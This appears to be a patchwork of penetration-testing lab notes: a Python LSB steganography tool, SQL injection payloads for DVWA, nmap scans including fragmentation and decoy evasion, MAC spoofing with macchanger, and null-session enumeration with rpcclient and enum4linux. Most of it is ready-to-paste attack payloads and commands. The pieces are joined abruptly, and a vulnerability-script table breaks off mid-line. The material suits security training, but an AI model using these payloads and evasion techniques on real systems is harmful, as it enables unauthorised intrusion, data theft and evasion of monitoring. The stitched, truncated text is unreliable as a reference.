from __future__ import annotations
import numpy as np
from PIL import Image
import zlib
from typing import Optional

def _bytes_to_bits(data: bytes) -> np.ndarray:
    return np.unpackbits(np.frombuffer(data, dtype=np.uint8))

def _bits_to_bytes(bits: np.ndarray) -> bytes:
    if bits.size % 8 != 0:
        raise ValueError("Bit array length not multiple of 8.")
    return np.packbits(bits.astype(np.uint8)).tobytes()

def _int_to_u32_be(n: int) -> bytes:
    return n.to_bytes(4, "big", signed=False)

def _u32_be_to_int(b: bytes) -> int:
    return int.from_bytes(b, "big", signed=False)

def _xor_keystream(data: bytes, password: str) -> bytes:
    if not password:
        return data
    mask = 0xFFFFFFFF
    state = zlib.crc32(password.encode("utf-8")) & mask
    ks = bytearray()
    for _ in range(len(data)):
        state = (state ^ ((state << 13) & mask)) & mask
        state = (state ^ (state >> 17)) & mask
        state = (state ^ ((state << 5) & mask)) & mask
        ks.append(state & 0xFF)
    return bytes(a ^ b for a, b in zip(data, ks))

def _ensure_rgb(img: Image.Image) -> Image.Image:
    return img if img.mode == "RGB" else img.convert("RGB")

def capacity_bytes(image_path: str) -> int:
    img = Image.open(image_path)
    img = _ensure_rgb(img)
    w, h = img.size
    return max(0, (w*h*3 - 64)//8)

def embed_text(cover_path: str, stego_path: str, message: str, password: Optional[str] = None) -> None:
    img = _ensure_rgb(Image.open(cover_path))
    arr = np.array(img)
    H, W, C = arr.shape
    payload = message.encode("utf-8")
    if password:
        payload = _xor_keystream(payload, password)
    length = len(payload)
    crc = zlib.crc32(payload) & 0xFFFFFFFF
    header = _int_to_u32_be(length) + _int_to_u32_be(crc)
    bitstream = _bytes_to_bits(header + payload)
    if bitstream.size > H*W*3:
        raise ValueError(f"Payload too large. Max {(H*W*3)//8-8} bytes")
    flat = arr.reshape(-1).astype(np.uint8)
    flat[:bitstream.size] = (flat[:bitstream.size] & 0xFE) | bitstream.astype(np.uint8)
    Image.fromarray(flat.reshape(H, W, 3).astype(np.uint8), "RGB").save(stego_path, format="PNG")

def extract_text(stego_path: str, password: Optional[str] = None) -> str:
    arr = np.array(_ensure_rgb(Image.open(stego_path)))
    flat = arr.reshape(-1)
    header_bits = (flat[:64] & 1).astype(np.uint8)
    header = _bits_to_bytes(header_bits)
    length = _u32_be_to_int(header[:4])
    crc_expected = _u32_be_to_int(header[4:8])
    payload_bits = (flat[64:64+length*8] & 1).astype(np.uint8)
    if payload_bits.size != length*8:
        raise ValueError("Stego image truncated or corrupted.")
    payload = _bits_to_bytes(payload_bits)
    if zlib.crc32(payload) & 0xFFFFFFFF != crc_expected:
        raise ValueError("CRC mismatch: wrong password or corrupted image.")
    if password:
        payload = _xor_keystream(payload, password)
    return payload.decode("utf-8", errors="replace")

if __name__ == "__main__":
    import argparse, os
    parser = argparse.ArgumentParser(description="LSB Image Steganography")
    sub = parser.add_subparsers(dest="cmd", required=True)
    p_cap = sub.add_parser("capacity")
    p_cap.add_argument("image")
    p_embed = sub.add_parser("embed")
    p_embed.add_argument("cover")
    p_embed.add_argument("output")
    p_embed.add_argument("text")
    p_embed.add_argument("--password", default=None)
    p_extract = sub.add_parser("extract")
    p_extract.add_argument("stego")
    p_extract.add_argument("--password", default=None)
    args = parser.parse_args()
    if args.cmd == "capacity":
        print(capacity_bytes(args.image))
    elif args.cmd == "embed":
        _, ext = os.path.splitext(args.output.lower())
        if ext not in (".png", ".bmp"):
            raise SystemExit("Output must be .png or .bmp")
        embed_text(args.cover, args.output, args.text, args.password)
        print(f"Embedded: {args.output}")
    elif args.cmd == "extract":
        try:
            print(extract_text(args.stego, args.password))
        except Exception as e:
            print("Error:", e)
# Open in browser:
http://<DVWA_HOST>/dvwa/vulnerabilities/sqli/

# Basic confirm:
1 OR 1=1

# Error fingerprint:
'            (single quote)

# Comment terminator (MySQL):
--  (use trailing space: -- )

# Example payloads to paste into ID field and Submit:
1' OR '1'='1' -- -
1' UNION SELECT NULL, version() -- -
1' UNION SELECT NULL, database() -- -
1 ORDER BY 1
1 ORDER BY 2
# Use ORDER BY n to discover column count

# UNION probe example (if 3 columns):
1' UNION SELECT 'a',NULL,NULL -- -
1' UNION SELECT NULL,'a',NULL -- -
# Replace 'a' to find reflected column(s)

# URL-encoded (curl) examples:
curl "http://<DVWA_HOST>/dvwa/vulnerabilities/sqli/?id=1%20OR%201=1"
curl "http://<DVWA_HOST>/dvwa/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20NULL,version()--%20-"

nmap -sn -PE 192.168.56.0/24 — ICMP Echo ping sweep (basic host discovery)
nmap -sn -PP 192.168.56.0/24 — ICMP Timestamp ping (alternate ICMP probe)
nmap -sn -PM 192.168.56.0/24 — ICMP Netmask ping (request netmask reply)
nmap -sn -PS22,80,443 192.168.56.0/24 — TCP SYN probes to ports 22/80/443 (find hosts that block ICMP)
sudo nmap -sn -PU53,161 192.168.56.0/24 — UDP probes to DNS/SNMP (UDP discovery; slow)
sudo nmap -sn -PS80,443 -PU53,161 192.168.56.0/24 — Combined TCP+UDP host discovery (max coverage)
nmap -n -sn 192.168.56.0/24 — Ping sweep no DNS (faster; skip reverse lookups)

nmap -sT 10.0.2.15 — TCP connect (full-open) scan (no raw sockets)
sudo nmap -sS 10.0.2.15 — TCP SYN (half-open) scan — stealthier, faster
sudo nmap -sS -f 10.0.2.15 — SYN scan with fragmentation (evade naive IDS)
sudo nmap -sS -D RND:5 10.0.2.15 — SYN scan with random decoys (confuse logs)
nmap -b ftp.relay.example:anonymous@domain.com 10.0.2.15 — FTP bounce scan via relay (legacy; rarely works)
sudo nmap -A 10.0.2.15 — Aggressive (OS, versions, scripts, traceroute) — noisy

nmap -sV 10.0.2.15 — Service/version detection (banner + fingerprint)
sudo nmap -O 10.0.2.15 — OS detection (fingerprinting; may need root)
nmap -p 21,22,80,443 -sV 10.0.2.15 — Scan specific ports and detect versions (faster)

nmap --script-help http-enum — Show what an NSE script does and its args
sudo nmap --script-trace --script http-enum -p80 10.0.2.15 — Trace socket activity of script (debug)
nmap --reason -p80,443 10.0.2.15 — Show the reason Nmap decided a port state (probe that caused it)
nmap --script-updatedb — Update local NSE script database after changes

sudo nmap -sS -n -p21,22,80,443 10.0.2.15 — Recommended quick external test: SYN scan, no DNS, target critical ports
Script Name Vulnerability Type Identified
http-enum Enumeration of web directories; reveals hidden or sensitive web
paths
http-vuln-cve2017-
5638
Apache Struts Remote Code Execution (CVE-2017-5638)
http-dombased-xss DOM-based Cross-Site Scripting (XSS) vulnerabilities
http-sql-injection SQL Injection flaws in web applications
http-shellshock Shellshock vulnerability in CGI scripts
smb-vuln-ms17-010 EternalBlue SMB Remote Code Execution vulnerability
smb-os-discovery OS version disclosure via SMB protocol
smb-enum-shares Enumeration of SMB shares; can reveal sensitive shares
smb-security-mode Detection of weak SMB security configurations
smb-vuln-cve-2017-
7494
Samba remote code execution vulnerability
ftp-anon Checks for anonymous FTP login enabled
ftp-vsftpd-backdoor vsFTPd backdoor detection
ftp-syst FTP server system information disclosure
ftp-bounce FTP bounce attack vulnerability
ssl-enum-ciphers Weak or outdated SSL/TLS cipher suites
mysql-emptypassword
MySQL accounts with empty passwords
dns-zone-transfer Misconfigured DNS servers allowing zone transfers
telnet-encryption Lack of


# 1) Check current MAC / interface info
ifconfig eth0                # or: ip link show eth0

# 2) Bring interface down
sudo ifconfig eth0 down      # or: sudo ip link set eth0 down

# 3) Change MAC address randomly
sudo macchanger -r eth0      # -r = random

# 4) Bring interface up
sudo ifconfig eth0 up        # or: sudo ip link set eth0 up

# 5) Verify current MAC
macchanger -s eth0           # shows current/permanent MAC
# or: ifconfig eth0 | grep -i ether


# null session (anonymous) RPC connection
rpcclient -U "" 192.168.1.10
# then at rpcclient> prompt try commands:

rpcclient $> enumdomusers
rpcclient $> queryuser <rid>        # inspect a user by RID
rpcclient $> getdompwinfo           # password policy
rpcclient $> srvinfo                # service info

# run a single command non-interactively:
rpcclient -U "" 192.168.1.10 -c "enumdomusers"


enum4linux -a 192.168.1.10
# -a = run all checks: users, shares, groups, policies, OS, etc.

enum4linux -U 192.168.1.10
# list users

enum4linux -S 192.168.1.10
# list shares

enum4linux -o 192.168.1.10
# show domain info / OS details (depends on version)

